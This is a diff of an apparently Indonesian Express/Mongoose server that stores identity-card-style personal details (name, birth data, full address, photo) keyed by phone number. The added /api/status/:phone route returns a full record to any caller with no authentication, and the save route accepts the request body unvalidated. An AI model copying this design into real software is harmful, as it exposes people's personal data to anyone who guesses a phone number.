@@ -4,15 +4,31 @@ const path = require("path");
 const mongoose = require("mongoose");
 const app = express();
 
-mongoose.connect(process.env.MONGO_URI);
+mongoose.connect(process.env.MONGO_URI)
+.then(() => console.log("MongoDB Connected"))
+.catch(err => console.log(err));
 
-mongoose.connection.once("open", () => {
-    console.log("MongoDB Connected");
+const PengajuanSchema = new mongoose.Schema({
+    phone: String,
+    nama: String,
+    tempat: String,
+    tanggal: String,
+    jk: String,
+    alamat: String,
+    rt: String,
+    rw: String,
+    desa: String,
+    kecamatan: String,
+    kabupaten: String,
+    provinsi: String,
+    foto: String,
+    createdAt: {
+        type: Date,
+        default: Date.now
+    }
 });
 
-mongoose.connection.on("error", err => {
-    console.log(err);
-});
+const Pengajuan = mongoose.model("Pengajuan", PengajuanSchema);
 
 /* TOKEN BOT */
 const BOT_TOKEN =
@@ -359,6 +375,59 @@ app.get("/status/:nmrx", (req,res)=>{
         success:true,
         status: statusData[nmrx] || "pending"
     });
+
+});
+
+app.post("/api/pengajuan", async (req, res) => {
+
+    try {
+
+        const data = new Pengajuan(req.body);
+
+        await data.save();
+
+        res.json({
+            success: true,
+            url: "/status.html"
+        });
+
+    } catch (err) {
+
+        console.log(err);
+
+        res.status(500).json({
+            success: false
+        });
+
+    }
+
+});
+
+app.get("/api/status/:phone", async (req, res) => {
+
+    try {
+
+        const data = await Pengajuan.findOne({
+            phone: req.params.phone
+        });
+
+        if(!data){
+            return res.status(404).json({
+                success: false
+            });
+        }
+
+        res.json(data);
+
+    } catch(err){
+
+        console.log(err);
+
+        res.status(500).json({
+            success: false
+        });
+
+    }
 
 });
 
